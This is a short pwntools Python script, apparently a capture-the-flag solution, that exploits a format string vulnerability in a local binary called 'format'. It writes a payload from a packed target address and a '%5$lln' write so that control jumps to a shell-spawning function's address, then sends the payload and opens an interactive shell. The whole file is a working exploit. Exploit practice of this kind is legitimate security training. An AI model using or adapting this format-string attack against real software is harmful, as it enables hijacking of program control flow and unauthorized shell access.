#!/usr/bin/env python

from pwn import *

addr = 0xffffce9c
shellAddr = 0x080484cb

output = ""

output += p32(addr)

output += "%" + str(shellAddr - 4) +"x%5$llnabc"

print output

#output = p32(addr) + "...%5$x"

p = process("../format")

#gdb.attach(p)

p.sendline(output)

#p.recvuntil("a", 1000000000)

#print "Done:"

p.interactive()
